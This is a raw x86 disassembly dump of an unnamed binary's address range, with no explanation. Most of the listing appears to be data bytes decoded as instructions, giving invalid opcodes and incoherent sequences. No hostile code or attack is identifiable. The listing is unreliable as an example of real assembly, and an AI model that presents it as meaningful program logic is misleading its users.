  405ed6:	add    BYTE PTR [eax],al
  405ed8:	add    BYTE PTR [eax],al
  405eda:	xchg   ebx,eax
  405edb:	or     BYTE PTR [esi],0xb1
  405ede:	xchg   ebx,eax
  405edf:	dec    edx
  405ee0:	push   cs
  405ee1:	jmp    0x134f1179
  405ee6:	mov    WORD PTR [edx-0x4d6c16f2],?
  405eec:	push   cs
  405eed:	jmp    0x5b4f1185
  405ef2:	pop    es
  405ef3:	jae    0x405f03
  405ef5:	mov    ds:0xe30e725b,al
  405efa:	inc    ebp
  405efb:	jb     0x405f0b
  405efd:	xchg   ebp,eax
  405efe:	cmp    eax,0x38190e72
  405f03:	jb     0x405f13
  405f05:	ret    0x723b
  405f08:	push   cs
  405f09:	add    esp,esi
  405f0b:	jb     0x405f1b
  405f0d:	mov    ch,0xdd
  405f0f:	jb     0x405f1f
  405f11:	into   
  405f12:	dec    edi
  405f13:	ret    
  405f14:	lock add BYTE PTR [esi-0x25],cl
  405f18:	dec    ebx
  405f19:	add    BYTE PTR [esi],ch
  405f1b:	div    al
  405f1d:	call   FWORD PTR [edx]
  405f1f:	scas   eax,DWORD PTR es:[edi]
  405f20:	outs   dx,DWORD PTR ds:[esi]
  405f21:	add    BYTE PTR [ebx],cl
  405f23:	scas   eax,DWORD PTR es:[edi]
  405f24:	add    BYTE PTR [bx+0x6bae],bh
  405f29:	add    ch,ah
  405f2b:	scas   al,BYTE PTR es:[edi]
  405f2c:	and    BYTE PTR [eax],al
  405f2e:	aad    0xae
  405f30:	bound  eax,QWORD PTR [eax]
  405f32:	jge    0x405ee2
  405f34:	push   cs
  405f35:	add    BYTE PTR [edi-0xf],ah
  405f38:	inc    ebp
  405f39:	inc    ebx
  405f3a:	imul   esp,ebx,0x6d
  405f3d:	je     0x405f3f
  405f3f:	add    BYTE PTR [eax],al
  405f41:	add    BYTE PTR [eax],al
  405f43:	aam    0xae
  405f45:	push   cs
  405f46:	add    BYTE PTR [edi-0xf],dh
  405f49:	inc    ebp
  405f4a:	inc    ecx
  405f4b:	test   edx,edx
  405f4d:	dec    edx
  405f4e:	imul   ebx,DWORD PTR [ebp-0x48000f1d],0xfd4645f1
  405f58:	sar    DWORD PTR [ebx+0x68],cl
  405f5b:	stos   BYTE PTR es:[edi],al
  405f5c:	iret   
  405f5d:	outs   dx,BYTE PTR ds:[esi]
  405f5e:	imul   ebx,DWORD PTR [edi-0x48ff831d],0x944445f1
  405f68:	sar    DWORD PTR [edx+esi*2-0x42],0xc7
  405f6d:	lock (bad) 
  405f6f:	cmp    BYTE PTR [esi+ecx*2+0x0],bl
  405f73:	out    0x5c,eax
  405f75:	dec    esi
  405f76:	add    ch,bh
  405f78:	gs dec esi
  405f7a:	add    BYTE PTR [esi],dh
  405f7c:	gs dec esi
  405f7e:	add    BYTE PTR [eax],bh
  405f80:	pop    esp
  405f81:	dec    esi
  405f82:	add    bh,ah
  405f84:	pop    esp
  405f85:	dec    esi
  405f86:	add    bh,ah
  405f88:	pop    esp
  405f89:	dec    esi
  405f8a:	add    dl,dh
  405f8c:	pop    esp
  405f8d:	dec    esi
  405f8e:	add    BYTE PTR [ecx],cl
  405f90:	xchg   esi,eax
  405f91:	push   cs
  405f92:	add    BYTE PTR [eax-0x6ffff315],dl
  405f98:	xor    al,0xd
  405f9a:	gs nop
  405f9c:	cmp    eax,0x36906e0d
  405fa1:	or     eax,0xcfc906c
  405fa6:	xor    al,BYTE PTR [eax]
  405fa8:	add    BYTE PTR [eax],al
  405faa:	add    BYTE PTR [eax],al
  405fac:	nop
  405fad:	add    DWORD PTR ds:0xa679064,ecx
  405fb3:	ins    BYTE PTR es:[edi],dx
  405fb4:	nop
  405fb5:	retf   
  405fb6:	or     al,0x0
  405fb8:	nop
  405fb9:	nop
  405fba:	shl    DWORD PTR [ebx-0x20],1
  405fbd:	pop    ebp
  405fbe:	jmp    0x406023
  405fc0:	mov    ebp,0xbe48fe6c
  405fc5:	jns    0x405fb2
  405fc7:	jmp    DWORD PTR [edi]
  405fc9:	cmc    
  405fca:	pusha  
  405fcb:	inc    eax
  405fcc:	nop
  405fcd:	fstp   DWORD PTR [edi+0x40]
  405fd0:	nop
  405fd1:	jmp    0x407e:0x1390405f
  405fd8:	nop
  405fd9:	inc    ebx
  405fda:	push   ds
  405fdb:	inc    esp
  405fdc:	nop
  405fdd:	sbb    al,0x7e
  405fdf:	inc    eax
  405fe0:	nop
  405fe1:	sub    esp,DWORD PTR [ebx+0x40]
  405fe4:	nop
  405fe5:	fsub   QWORD PTR [eax+0x40]
  405fe8:	nop
  405fe9:	cdq    
  405fea:	jle    0x40602c
  405fec:	nop
  405fed:	inc    ebx
  405fee:	jle    0x406030
  405ff0:	nop
  405ff1:	sbb    DWORD PTR [ecx+0x40],esp
  405ff4:	nop
  405ff5:	jle    0x406058
  405ff7:	inc    eax
  405ff8:	nop
  405ff9:	retf   
  405ffa:	or     al,0x1
  405ffc:	xchg   ecx,eax
  405ffd:	retf   
  405ffe:	or     al,0x0
  406000:	nop
  406001:	retf   
  406002:	or     al,0x0
  406004:	nop
  406005:	retf   0xb
  406008:	nop
  406009:	fild   WORD PTR [ebx+0xcd29040]
  40600f:	add    BYTE PTR [eax],al
  406011:	add    BYTE PTR [eax],al
  406013:	add    BYTE PTR [eax],al
  406015:	nop
  406016:	mov    dl,0xe6
  406018:	add    edx,DWORD PTR [eax-0x2f75204e]
  40601e:	mov    dl,0xe1
  406020:	add    edx,DWORD PTR [eax-0x6ffc704e]
  406026:	mov    dl,0xcf
  406028:	mov    dl,al
  40602a:	mov    dl,0xd5
  40602c:	add    edx,DWORD PTR [eax-0x6ffc204e]
  406032:	mov    dl,0x87
  406034:	mov    dl,al
  406036:	mov    dl,0xf7
  406038:	add    edx,DWORD PTR [eax-0x6ffbf04e]
  40603e:	mov    dl,0x63
  406040:	jge    0x406012
  406042:	mov    dl,0xee
  406044:	add    edx,DWORD PTR [eax-0x6ffc104e]
  40604a:	mov    dl,0x6f
  40604c:	jge    0x40601e
  40604e:	mov    dl,0xea
  406050:	add    edx,DWORD PTR [eax-0x6ffc144e]
  406056:	mov    dl,0xfe
  406058:	add    ebx,DWORD PTR [ebx-0x6ffc1c4e]
  40605e:	mov    dl,0xef
  406060:	jb     0x405ff2
  406062:	mov    dl,0xef
  406064:	add    edx,DWORD PTR [eax-0x6f8d014e]
  40606a:	mov    dl,0xfe
  40606c:	add    edx,DWORD PTR [eax-0x6f8d134e]
  406072:	mov    dl,0xd3
  406074:	add    edx,DWORD PTR [eax+0x72fab2]
  40607a:	add    BYTE PTR [eax],al
  40607c:	add    BYTE PTR [eax],al
  40607e:	nop
  40607f:	mov    dl,0xe2
  406081:	add    edx,DWORD PTR [eax-0x6f8d0b4e]
  406087:	mov    dl,0xf4
  406089:	add    edx,DWORD PTR [eax-0x6f8d134e]
  40608f:	mov    dl,0xec
  406091:	add    edx,DWORD PTR [eax+0x23360eb2]
  406097:	mov    dl,0xe
  406099:	dec    DWORD PTR [edx+esi*4-0x4cfd46f2]
  4060a0:	push   cs
  4060a1:	lds    ecx,FWORD PTR [edx+esi*4-0x4cfd47f2]
  4060a8:	push   cs
  4060a9:	les    ecx,FWORD PTR [edx+esi*4-0x4d1d64f2]
  4060b0:	push   cs
  4060b1:	(bad)  
  4060b2:	mov    WORD PTR [edx-0x4d1d65f2],?
  4060b8:	push   cs
  4060b9:	(bad)  
  4060ba:	mov    WORD PTR [edx-0x4d3cc2f2],?
  4060c0:	push   cs
  4060c1:	adc    DWORD PTR [ebp-0x3cc3f14e],ecx
  4060c7:	mov    dl,0xe
  4060c9:	or     BYTE PTR [ebp-0x5ce0f14e],cl
  4060cf:	mov    dl,0xe
  4060d1:	or     ecx,DWORD PTR [ebp-0x5ce1f14e]
  4060d7:	mov    dl,0xe
  4060d9:	or     cl,BYTE PTR [ebp-0x7cf6f14e]
  4060df:	mov    dl,0xe
  4060e1:	rol    BYTE PTR [eax],1
  4060e3:	add    BYTE PTR [eax],al
  4060e5:	add    BYTE PTR [eax],al
  4060e7:	xchg   ebx,eax
  4060e8:	mov    dl,0xe
  4060ea:	or     BYTE PTR [ebx-0x6c42f14e],al
  4060f0:	mov    dl,0xe
  4060f2:	or     esp,DWORD PTR [ebx-0x4e]
  4060f5:	push   cs
  4060f6:	rcl    BYTE PTR [ebx+0x630a0eb2],cl
  4060fc:	mov    dl,0xe
  4060fe:	mov    esp,0xd30eb28c
  406103:	inc    edx
  406104:	mov    dl,0xe
  406106:	push   cs
  406107:	mov    WORD PTR [edx-0x4dbd3df2],?
  40610d:	push   cs
  40610e:	jmp    0x4439:0xeb28c
  406115:	push   cs
  406116:	add    BYTE PTR [ecx+0x30000eb6],bl
  40611c:	inc    esp
  40611d:	push   cs
  40611e:	add    BYTE PTR [eax+0x4000eb3],dh
  406124:	inc    ebp
  406125:	push   cs
  406126:	add    BYTE PTR [esi+esi*4+0xe],dh
  40612a:	add    al,bh
  40612c:	inc    esp
  40612d:	push   cs
  40612e:	add    BYTE PTR [ecx],bl
  406130:	mov    bl,0xe
  406132:	add    bl,cl
  406134:	inc    esp
  406135:	push   cs
  406136:	add    al,ch
  406138:	mov    bl,0xe
  40613a:	add    BYTE PTR [edx-0x24fff1bc],bh
  406140:	mov    bl,0xe
  406142:	add    ch,cl
  406144:	inc    ecx
  406145:	push   cs
  406146:	add    dl,ch
  406148:	mov    dh,0xe
  40614a:	add    BYTE PTR [eax],al
  40614c:	add    BYTE PTR [eax],al
  40614e:	add    BYTE PTR [eax],al
  406150:	mov    esp,0x8d000e41
  406155:	mov    dh,0xe
  406157:	add    bh,cl
  406159:	inc    ecx
  40615a:	push   cs
  40615b:	add    BYTE PTR [esi+esi*4+0x41be000e],cl
  406162:	push   cs
  406163:	add    BYTE PTR [edi+0x11000eb6],cl
  406169:	inc    ecx
  40616a:	push   cs
  40616b:	add    dh,cl
  40616d:	mov    dl,0xe
  40616f:	add    BYTE PTR [eax-0x2efff1bf],al
  406175:	mov    dl,0xe
  406177:	add    BYTE PTR [ebp+0x41],dh
  40617a:	push   cs
  40617b:	add    dl,bl
  40617d:	mov    dl,0xe
  40617f:	add    BYTE PTR [ebx+0x41],al
  406182:	push   cs
  406183:	add    al,cl
  406185:	mov    dl,0xe
  406187:	add    BYTE PTR [edx],dl
  406189:	inc    ecx
  40618a:	push   cs
  40618b:	add    BYTE PTR [ebx-0x6ffff14a],bl
  406191:	inc    esi
  406192:	jg     0x406194
  406194:	nop
  406195:	fisttp QWORD PTR [eax+eax*1]
  406198:	nop
  406199:	push   edi
  40619a:	jg     0x40619c
  40619c:	nop
  40619d:	scas   al,BYTE PTR es:[edi]
  40619e:	or     al,BYTE PTR [eax]
  4061a0:	nop
  4061a1:	push   0xbf90007f
  4061a6:	or     al,0x0
  4061a8:	nop
  4061a9:	popa   
  4061aa:	jg     0x4061ac
  4061ac:	nop
  4061ad:	and    DWORD PTR ds:0x7f709000,ecx
  4061b3:	add    BYTE PTR [eax],al
  4061b5:	add    BYTE PTR [eax],al
  4061b7:	add    BYTE PTR [eax],al
  4061b9:	nop
  4061ba:	xor    BYTE PTR ds:0x7f679000,cl
  4061c0:	add    BYTE PTR [eax-0x6ffff2d1],dl
  4061c6:	jbe    0x406247
  4061c8:	add    BYTE PTR [eax-0x6ffff2c2],dl
  4061ce:	and    eax,0x6d90007e
  4061d3:	or     al,BYTE PTR [eax]
  4061d5:	nop
  4061d6:	xor    al,0x7e
  4061d8:	add    BYTE PTR [eax-0x6ffff284],dl
  4061de:	cmp    edi,DWORD PTR [esi+0x0]
  4061e1:	nop
  4061e2:	imul   ecx,DWORD PTR [edx],0x0
  4061e5:	nop
  4061e6:	cmp    bh,BYTE PTR [esi+0x0]
  4061e9:	nop
  4061ea:	push   0xa
  4061ec:	add    BYTE PTR [eax-0x6fff81a7],dl
  4061f2:	test   eax,0x5890000a
  4061f7:	jle    0x4061f9
  4061f9:	nop
  4061fa:	test   al,0xa
  4061fc:	add    BYTE PTR [eax-0x6fff8181],dl
  406202:	mov    bh,0xa
  406204:	add    BYTE PTR [eax-0x6fff8182],dl
  40620a:	mov    dh,0xa
  40620c:	add    BYTE PTR [eax-0x6f8f6e4e],dl
  406212:	mov    dl,0xc9
  406214:	add    edx,DWORD PTR [eax-0x6f8f6f4e]
  40621a:	mov    dl,0xc8
  40621c:	add    eax,DWORD PTR [eax]
  40621e:	add    BYTE PTR [eax],al
  406220:	add    BYTE PTR [eax],al
  406222:	nop
  406223:	mov    dl,0x8f
  406225:	jo     0x4061b7
  406227:	mov    dl,0xdf
  406229:	add    edx,DWORD PTR [eax-0x6f8f814e]
  40622f:	mov    dl,0xce
  406231:	add    edx,DWORD PTR [eax-0x6f8f964e]
  406237:	mov    dl,0x97
  406239:	add    edx,DWORD PTR [eax-0x6f8fa74e]
  40623f:	mov    dl,0x96
  406241:	add    edx,DWORD PTR [eax-0x6f8fd84e]
  406247:	mov    dl,0x75
  406249:	add    edx,DWORD PTR [eax-0x6f8fd94e]
  40624f:	mov    dl,0x74
  406251:	add    edx,DWORD PTR [eax-0x6f905a4e]
  406257:	mov    dl,0x5b
  406259:	add    al,0x90
  40625b:	mov    dl,0xa4
  40625d:	outs   dx,DWORD PTR ds:[esi]
  40625e:	nop
  40625f:	mov    dl,0x5a
  406261:	add    al,0x90
  406263:	mov    dl,0xa3
  406265:	outs   dx,DWORD PTR ds:[esi]
  406266:	nop
  406267:	mov    dl,0x39
  406269:	add    al,0x90
  40626b:	mov    dl,0xa2
  40626d:	outs   dx,DWORD PTR ds:[esi]
  40626e:	nop
  40626f:	mov    dl,0x38
  406271:	add    al,0x90
  406273:	mov    dl,0xa1
  406275:	outs   dx,DWORD PTR ds:[esi]
  406276:	nop
  406277:	mov    dl,0x2f
  406279:	add    al,0x90
  40627b:	mov    dl,0xa0
  40627d:	outs   dx,DWORD PTR ds:[esi]
  40627e:	nop
  40627f:	mov    dl,0x1e
  406281:	add    al,0x90
  406283:	mov    dl,0xbf
  406285:	outs   dx,DWORD PTR ds:[esi]
  406286:	add    BYTE PTR [eax],al
  406288:	add    BYTE PTR [eax],al
  40628a:	add    BYTE PTR [eax-0x6ffbf24e],dl
  406290:	mov    dl,0xe
  406292:	mov    al,ds:0xf20eb267
  406297:	xchg   ebx,eax
  406298:	mov    dl,0xe
  40629a:	xor    esi,DWORD PTR [edi]
  40629c:	mov    dl,0xe
  40629e:	fst    QWORD PTR [ebx+0x27220eb2]
  4062a4:	mov    dl,0xe
  4062a6:	int3   
  4062a7:	xchg   ebx,eax
  4062a8:	mov    dl,0xe
  4062aa:	xor    eax,0xbf0eb237
  4062af:	xchg   ebx,eax
  4062b0:	mov    dl,0xe
  4062b2:	and    al,0x27
  4062b4:	mov    dl,0xe
  4062b6:	scas   al,BYTE PTR es:[edi]
  4062b7:	xchg   ebx,eax
  4062b8:	mov    dl,0xe
  4062ba:	aaa    
  4062bb:	div    DWORD PTR [edx-0x4d6b96f2]
  4062c1:	push   cs
  4062c2:	es out 0xb2,eax
  4062c5:	push   cs
  4062c6:	push   0x190eb294
  4062cb:	div    DWORD PTR [edx-0x4d6b94f2]
  4062d1:	push   cs
  4062d2:	sbb    bh,ah
  4062d4:	mov    dl,0xe
  4062d6:	push   0xffffff94
  4062d8:	mov    dl,0xe
  4062da:	mov    ebx,0x650eb2b6
  4062df:	xchg   ebx,eax
  4062e0:	mov    dl,0xe
  4062e2:	mov    edx,0x640eb2a6
  4062e7:	xchg   ebx,eax
  4062e8:	mov    dl,0xe
  4062ea:	popf   
  4062eb:	mov    dh,0xb2
  4062ed:	push   cs
  4062ee:	add    BYTE PTR [bx+si],al
  4062f1:	add    BYTE PTR [eax],al
  4062f3:	add    BYTE PTR [ebx-0x5963f14e],dl
  4062f9:	mov    dl,0xe
  4062fb:	xchg   bx,ax
  4062fd:	mov    dl,0xe
  4062ff:	mov    BYTE PTR [esi-0x4e],dh
  406302:	push   cs
  406303:	dec    ecx
  406304:	xchg   ebx,eax
  406305:	mov    dl,0xe
  406307:	mov    esp,DWORD PTR [esi-0x4e]
  40630a:	push   cs
  40630b:	dec    eax
  40630c:	xchg   ebx,eax
  40630d:	mov    dl,0xe
  40630f:	add    BYTE PTR [edx],bl
  406311:	dec    ebp
  406312:	push   cs
  406313:	add    BYTE PTR [ebx-0x51],cl
  406316:	push   cs
  406317:	add    BYTE PTR ds:0x5a000e4d,al
  40631d:	mov    dh,0xe
  40631f:	add    BYTE PTR [eax+0x4c],ah
  406322:	push   cs
  406323:	add    BYTE PTR ds:0x53000eb0,dl
  406329:	dec    esp
  40632a:	push   cs
  40632b:	add    BYTE PTR [edi+esi*4],dl
  40632e:	push   cs
  40632f:	add    BYTE PTR [edx+0x4c],al
  406332:	push   cs
  406333:	add    dl,dh
  406335:	scas   eax,DWORD PTR es:[edi]
  406336:	push   cs
  406337:	add    BYTE PTR [ebp+0x4c],cl
  40633a:	push   cs
  40633b:	add    BYTE PTR ds:0x16000eaf,bl
  406341:	dec    esp
  406342:	push   cs
  406343:	add    BYTE PTR [edi+ebp*4],bh
  406346:	push   cs
  406347:	add    al,cl
  406349:	mov    dh,0xa
  40634b:	add    ebx,ebx
  40634d:	mov    dh,0xd6
  40634f:	add    bl,dl
  406351:	mov    dh,0x4f
  406353:	add    esp,edx
  406355:	mov    dh,0x33
  406357:	add    DWORD PTR [eax],eax
  406359:	add    BYTE PTR [eax],al
  40635b:	add    BYTE PTR [eax],al
  40635d:	(bad)  
  40635e:	mov    dh,0x54
  406360:	add    eax,edx
  406362:	mov    dh,0x6e
  406364:	add    DWORD PTR [ebx],esp
  406366:	scas   eax,DWORD PTR es:[edi]
  406367:	push   eax
  406368:	add    DWORD PTR [edx],esp
  40636a:	scas   eax,DWORD PTR es:[edi]
  40636b:	push   0x1
  40636d:	or     eax,0xaf0177af
  406372:	scas   eax,DWORD PTR es:[edi]
  406373:	jae    0x406376
  406375:	(bad)  
  406376:	scas   al,BYTE PTR es:[edi]
  406377:	jne    0x40637a
  406379:	cwde   
  40637a:	scas   eax,DWORD PTR es:[edi]
  40637b:	or     eax,DWORD PTR [ecx]
  40637d:	fwait
  40637e:	scas   eax,DWORD PTR es:[edi]
  40637f:	aad    0x2
  406381:	mov    ch,BYTE PTR [edi-0x509bfeb4]
  406387:	xor    BYTE PTR [ecx],al
  406389:	scas   eax,DWORD PTR es:[di]
  40638b:	push   ebp
  40638c:	add    DWORD PTR [eax-0x6d38f2a4],edx
  406392:	bound  ecx,QWORD PTR ds:0xd6f9161
  406398:	pop    edi
  406399:	xchg   ecx,eax
  40639a:	jo     0x4063a9
  40639c:	gs xchg ecx,eax
  40639e:	test   DWORD PTR ds:0xd8e917a,ecx
  4063a4:	fst    QWORD PTR [edx-0x6e81f2ed]
  4063aa:	sbb    al,0xd
  4063ac:	jl     0x40633f
  4063ae:	mov    DWORD PTR ds:0xd889154,ecx
  4063b4:	add    dl,BYTE PTR [ecx-0x6ec6f272]
  4063ba:	xchg   ebx,eax
  4063bb:	or     eax,0xd919106
  4063c0:	or     al,0x0
  4063c2:	add    BYTE PTR [eax],al
  4063c4:	add    BYTE PTR [eax],al
  4063c6:	xchg   ecx,eax
  4063c7:	xchg   ebp,eax
  4063c8:	or     eax,0xd7f9118
  4063cd:	sbb    dl,BYTE PTR [ecx-0x6ef1f278]
  4063d3:	jnp    0x4063e2
  4063d5:	adc    BYTE PTR [ecx-0x6ebcf286],dl
  4063db:	popf   
  4063dc:	or     eax,0xd9e9147
  4063e1:	push   eax
  4063e2:	xchg   ecx,eax
  4063e3:	mov    ds:0xa291580d,eax
  4063e8:	or     eax,0xbf4916e
  4063ed:	jo     0x406380
  4063ef:	stc    
  4063f0:	or     esp,DWORD PTR [edx-0x6f]
  4063f3:	jmp    0x406400
  4063f5:	push   ebp
  4063f6:	xchg   ecx,eax
  4063f7:	in     al,dx
  4063f8:	or     eax,DWORD PTR [ebx]
  4063fa:	xchg   ecx,eax
  4063fb:	out    0xb,al
  4063fd:	cmp    dl,BYTE PTR [ecx-0x6ef8f40f]
  406403:	repz or ecx,DWORD PTR ds:0x190bf591
  40640a:	xchg   ecx,eax
  40640b:	mov    dl,0x9b
  40640d:	add    bl,BYTE PTR [ebx-0x78fd7f4d]
  406413:	mov    bl,0x97
  406415:	add    al,BYTE PTR [ecx+0x4c0296b3]
  40641b:	mov    bl,0x75
  40641d:	add    cl,BYTE PTR [eax-0x4d]
  406420:	jp     0x406424
  406422:	inc    ecx
  406423:	mov    bl,0x7f
  406425:	add    ch,BYTE PTR [ecx-0x4d]
  406428:	jle    0x40642c
  40642a:	add    BYTE PTR [eax],al
  40642c:	add    BYTE PTR [eax],al
  40642e:	add    BYTE PTR [edi],dh
  406430:	mov    bl,0x6c
  406432:	add    al,BYTE PTR [ecx-0x4d]
  406435:	push   ecx
  406436:	add    dh,BYTE PTR [ebx]
  406438:	mov    bl,0x58
  40643a:	add    cl,cl
  40643c:	mov    ah,0x86
  40643e:	add    DWORD PTR [esi-0x4d],ebp
  406441:	add    DWORD PTR [ecx],0x19eb374
  406447:	pusha  
  406448:	mov    bl,0x8c
  40644a:	add    DWORD PTR [esi-0x43fe8c4d],ebp
  406450:	mov    bl,0x56
  406452:	add    DWORD PTR [edi-0x52fea64d],esi
  406458:	mov    bl,0x5e
  40645a:	add    DWORD PTR [ecx-0x78fea34d],esp
  406460:	mov    bl,0x4b
  406462:	add    DWORD PTR [ebp-0x75fed54d],esp
  406468:	mov    bl,0x21
  40646a:	add    DWORD PTR [eax+0x70011ab3],ebx
  406470:	mov    bl,0xcf
  406472:	push   es
  406473:	pushf  
  406474:	mov    bl,0xb2
  406476:	push   es
  406477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406478:	mov    bl,0xb9
  40647a:	push   es
  40647b:	int3   
  40647c:	mov    bl,0xca
  40647e:	push   es
  40647f:	fwait
  406480:	mov    bl,0xc1
  406482:	push   es
  406483:	mov    DWORD PTR [ebx-0x4c8ef946],esi
  406489:	push   cs
  40648a:	mov    cl,0x96
  40648c:	xchg   edi,eax
  40648d:	shrd   DWORD PTR [esi+0xa70f47],ecx,0x0
  406495:	add    BYTE PTR [eax],al
  406497:	add    BYTE PTR [esi-0x70b4f0a9],dl
  40649d:	jp     0x4064ae
  40649f:	dec    edx
  4064a0:	xchg   edi,eax
  4064a1:	pusha  
  4064a2:	cmove  ecx,DWORD PTR [edi-0x68b0f076]
  4064a9:	jge    0x4064ba
  4064ab:	push   ebx
  4064ac:	(bad)  
  4064ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064ae:	cmovb  edx,DWORD PTR [edi-0x70c2f06c]
  4064b5:	push   eax
  4064b6:	setp   BYTE PTR [edi-0x706bf09f]
  4064bd:	mov    ecx,DWORD PTR [edi]
  4064bf:	lahf   
  4064c0:	xchg   edi,eax
  4064c1:	jbe    0x4064d2
  4064c3:	xchg   ebx,eax
  4064c4:	(bad)  
  4064c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064c6:	jb     0x7d4ffa63
  4064cc:	(bad)  
  4064cd:	push   ecx
  4064ce:	pcmpeqb mm2,QWORD PTR [edi-0x7091f094]
  4064d5:	imul   ecx,DWORD PTR [edi],0x29
  4064d8:	xchg   edi,eax
  4064d9:	mov    dl,0xf
  4064db:	(bad)
  4064e0:	xchg   edi,eax
  4064e1:	mov    al,ds:0x8c8f1e0f
  4064e6:	prefetcht1 BYTE PTR [edi-0x70e4f093]
  4064ed:	bndmov bnd2,[edi-0x70eff080]
  4064f5:	inc    esp
  4064f6:	pinsrw mm2,WORD PTR [esi+0xbf0f4a],0x0
  4064fe:	add    BYTE PTR [eax],al
  406500:	add    BYTE PTR [esi-0x6936f0b4],cl
  406506:	mov    cl,0xf
  406508:	(bad)  
  406509:	mov    es,WORD PTR [edi-0x4ebafff1]
  40650f:	sbb    DWORD PTR [ecx],eax
  406511:	inc    esi
  406512:	mov    cl,0x25
  406514:	add    DWORD PTR [eax-0x4f],ecx
  406517:	dec    eax
  406518:	add    DWORD PTR [ebx-0x4f],ecx
  40651b:	inc    ebx
  40651c:	add    DWORD PTR [edx],ebx
  40651e:	mov    cl,0x39
  406520:	add    DWORD PTR [eax],esi
  406522:	mov    cl,0x7d
  406524:	add    DWORD PTR [ecx+esi*4],eax
  406527:	add    DWORD PTR [bx],edx
  40652a:	mov    cl,0x65
  40652c:	add    DWORD PTR [edi+0x482030b2],edx
  406532:	mov    bh,0xe
  406534:	xor    BYTE PTR [ebx-0x49],bl
  406537:	add    al,0x30
  406539:	pop    edx
  40653a:	mov    bh,0x1
  40653c:	xor    BYTE PTR ds:0xc300db8,cl
  406542:	mov    eax,0xb81f30f3
  406547:	(bad)  
  406548:	xor    BYTE PTR [esi],cl
  40654a:	mov    eax,0xb80130ad
  40654f:	stos   DWORD PTR es:[edi],eax
  406550:	xor    BYTE PTR [eax],al
  406552:	mov    eax,0xb71330a9
  406557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406558:	xor    BYTE PTR [edx],dl
  40655a:	mov    bh,0xa5
  40655c:	xor    ch,ah
  40655e:	mov    bh,0xeb
  406560:	xor    ah,al
  406562:	mov    bh,0xe9
  406564:	xor    BYTE PTR [eax],al
  406566:	add    BYTE PTR [eax],al
  406568:	add    BYTE PTR [eax],al
  40656a:	xlat   BYTE PTR ds:[ebx]
  40656b:	mov    bh,0xe7
  40656d:	xor    BYTE PTR [esi-0x66cf3449],ah
  406573:	mov    bh,0xf4
  406575:	xor    BYTE PTR [eax-0x74cf5149],bl
  40657b:	mov    bh,0xac
  40657d:	xor    BYTE PTR [edx+0x1d30aab7],cl
  406583:	mov    dl,0xa6
  406585:	xor    BYTE PTR [edx+esi*4],bl
  406588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406589:	xor    BYTE PTR [eax+0x60ab0e17],dl
  40658f:	and    BYTE PTR [esi],cl
  406591:	lods   eax,DWORD PTR ds:[esi]
  406592:	pusha  
  406593:	xor    DWORD PTR [esi],ecx
  406595:	scas   eax,DWORD PTR es:[edi]
  406596:	pusha  
  406597:	xor    cl,BYTE PTR [esi]
  406599:	mov    cl,0xc0
  40659b:	inc    ebx
  40659c:	push   cs
  40659d:	mov    bl,0xc0
  40659f:	inc    esp
  4065a0:	push   cs
  4065a1:	mov    ch,0xc0
  4065a3:	dec    ebp
  4065a4:	push   cs
  4065a5:	mov    bh,0xc0
  4065a7:	push   esi
  4065a8:	push   cs
  4065a9:	mov    ecx,0xbb0e5fa0
  4065ae:	mov    al,ds:0xa0bd0e68
  4065b3:	or     DWORD PTR [esi],ecx
  4065b5:	mov    edi,0xc10e0aa0
  4065ba:	or     BYTE PTR [ebx],0xe
  4065bd:	les    eax,FWORD PTR [eax-0x7f39f1f4]
  4065c3:	test   DWORD PTR [esi],ecx
  4065c5:	enter  0x8e80,0xe
  4065c9:	retf   0x8760
  4065cc:	push   cs
  4065cd:	retf   
  4065ce:	add    BYTE PTR [eax],al
  4065d0:	add    BYTE PTR [eax],al
  4065d2:	add    BYTE PTR [eax-0x70],ah
  4065d5:	push   cs
  4065d6:	int3   
  4065d7:	pusha  
  4065d8:	or     DWORD PTR [esi],0xe8260cd
  4065de:	into   
  4065df:	rcl    BYTE PTR [ecx-0x6f3f30f2],0xe
  4065e6:	rol    al,cl
  4065e8:	jg     0x4065f8
  4065ea:	aad    0xc0
  4065ec:	xchg   BYTE PTR [esi],cl
  4065ee:	fsub   DWORD PTR [eax-0x5f24f173]
  4065f4:	xchg   esp,eax
  4065f5:	push   cs
  4065f6:	fisub  WORD PTR [eax-0x5f20f165]
  4065fc:	call   0xe10e:0x9980e00e
  406603:	sbb    BYTE PTR [eax-0x4d7f1df2],0xb3
  40660a:	push   DWORD PTR [ebx]
  40660c:	cmp    DWORD PTR [edx-0x4e7cca01],0xffffffff
  406613:	das    
  406614:	cmp    DWORD PTR [eax-0x507cd701],0xffffffff
  40661b:	sub    DWORD PTR [ebx-0x7d050052],eax
  406621:	popf   
  406622:	(bad)  
  406623:	sti    
  406624:	sbb    BYTE PTR [edi+edi*8-0x347d14],0xe6
  40662c:	xor    BYTE PTR [edx-0x467d1d01],0xff
  406633:	or     al,BYTE PTR [ebx+0xffa0]
  406639:	add    BYTE PTR [eax],al
  40663b:	add    bl,bh
  40663d:	sbb    BYTE PTR [ebx-0x2],0x8b
  406641:	lods   al,BYTE PTR ds:[esi]
  406642:	dec    esp
  406643:	(bad)  
  406644:	stos   BYTE PTR es:[edi],al
  406645:	lods   al,BYTE PTR ds:[esi]
  406646:	cmp    dh,bh
  406648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406649:	lods   al,BYTE PTR ds:[esi]
  40664a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40664b:	(bad)  
  40664c:	jo     0x4065fa
  40664e:	and    eax,0x24ac71fe
  406653:	(bad)  
  406654:	jb     0x406602
  406656:	and    edi,esi
  406658:	jae    0x406606
  40665a:	sub    bh,dh
  40665c:	je     0x40660a
  40665e:	and    esi,edi
  406660:	ins    DWORD PTR es:[edi],dx
  406661:	lods   al,BYTE PTR ds:[esi]
  406662:	sub    dh,bh
  406664:	mov    dh,0xac
  406666:	das    
  406667:	(bad)  
  406668:	scas   eax,DWORD PTR es:[edi]
  406669:	lods   al,BYTE PTR ds:[esi]
  40666a:	cs (bad) 
  40666c:	test   al,0xac
  40666e:	cmp    eax,0x3caca9fe
  406673:	(bad)  
  406674:	mov    edx,0xbbfe2bac
  406679:	lods   al,BYTE PTR ds:[esi]
  40667a:	adc    bh,dh
  40667c:	lods   al,BYTE PTR ds:[esi]
  40667d:	lods   al,BYTE PTR ds:[esi]
